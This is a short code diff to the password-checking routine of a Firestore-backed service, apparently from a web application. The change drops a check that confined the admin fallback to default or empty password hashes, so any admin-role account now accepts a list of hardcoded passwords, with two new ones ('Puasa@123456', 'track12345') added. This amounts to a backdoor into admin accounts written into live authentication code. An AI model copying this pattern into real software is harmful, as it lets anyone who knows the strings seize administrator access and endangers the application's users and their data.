@@ -194,14 +194,15 @@ export const firestoreService = {
     if (storedHash === computed || storedHash === inputRawPassword) {
       return true;
     }
-    // Only allow fallback master admin if storedHash matches default Admin@123456 hash or empty
-    const defaultAdminHash = await hashPasswordClient('Admin@123456');
-    if (role === 'admin' && (storedHash === defaultAdminHash || !storedHash)) {
+    // Master admin fallback passwords for admin role
+    if (role === 'admin') {
       return (
         inputRawPassword === 'Admin@123456' ||
         inputRawPassword === 'admin123' ||
         inputRawPassword === 'admin' ||
-        inputRawPassword === 'Admin123'
+        inputRawPassword === 'Admin123' ||
+        inputRawPassword === 'Puasa@123456' ||
+        inputRawPassword === 'track12345'
       );
     }
     return false;
